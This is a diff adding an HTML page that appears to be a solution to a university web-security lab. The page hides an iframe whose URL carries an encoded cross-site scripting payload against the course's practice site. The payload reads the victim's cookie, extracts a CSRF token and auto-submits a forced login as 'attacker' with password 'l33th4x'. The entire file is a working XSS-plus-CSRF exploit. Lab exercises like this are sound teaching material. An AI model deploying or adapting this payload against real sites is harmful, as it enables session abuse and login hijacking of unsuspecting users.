@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<style>
+  /* Hide the iframe */
+  iframe {
+    display: none;
+  }
+</style>
+
+<iframe src = "https://project2.ecen4133.org/search?q=%3Cscript%3E%0A%0Adocument.addEventListener%28%27DOMContentLoaded%27%2C%20function%28%29%20%7B%0A%09var%20cookie%20%3D%20document.cookie%3B%0A%20%20%20%20%20%20%20%20var%20token%20%3D%20document.cookie.substring%2811%2Ccookie.length%29%3B%0Aconsole.log%28cookie%29%3B%0Aconsole.log%28token%29%0A%0A%20%20%20%20%20%20%20%20var%20form%20%3D%20document.createElement%28%27form%27%29%3B%0A%20%20%20%20%20%20%20%20form.method%20%3D%20%27post%27%3B%0A%20%20%20%20%20%20%20%20form.action%20%3D%20%27https%3A%2F%2Fproject2.ecen4133.org%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%27%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20var%20hiddenField1%20%3D%20document.createElement%28%27input%27%29%3B%0A%20%20%20%20%20%20%20%20hiddenField1.type%20%3D%20%27hidden%27%3B%0A%20%20%20%20%20%20%20%20hiddenField1.name%20%3D%20%27csrf_token%27%3B%0A%20%20%20%20%20%20%20%20hiddenField1.value%20%3D%20token%3B%0A%20%20%20%20%20%20%20%20form.appendChild%28hiddenField1%29%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20var%20hiddenField2%20%3D%20document.createElement%28%27input%27%29%3B%0A%20%20%20%20%20%20%20%20hiddenField2.type%20%3D%20%27hidden%27%3B%0A%20%20%20%20%20%20%20%20hiddenField2.name%20%3D%20%27username%27%3B%0A%20%20%20%20%20%20%20%20hiddenField2.value%20%3D%20%27attacker%27%3B%0A%20%20%20%20%20%20%20%20form.appendChild%28hiddenField2%29%3B%0A%0A%20%20%20%20%20%20%20%20var%20hiddenField3%20%3D%20document.createElement%28%27input%27%29%3B%0A%20%20%20%20%20%20%20%20hiddenField3.type%20%3D%20%27hidden%27%3B%0A%20%20%20%20%20%20%20%20hiddenField3.name%20%3D%20%27password%27%3B%0A%20%20%20%20%20%20%20%20hiddenField3.value%20%3D%20%27l33th4x%27%3B%0A%20%20%20%20%20%20%20%20form.appendChild%28hiddenField3%29%3B%0A%0A%20%20%20%20%20%20%20%20document.body.appendChild%28form%29%3B%0A%20%20%20%20%20%20%20%20form.submit%28%29%3B%0A%7D%29%3B%0A%0A%3C%2Fscript%3E&csrfdefense=1&xssdefense=0" name="eviliframe" >
+</html>
+
+	
+
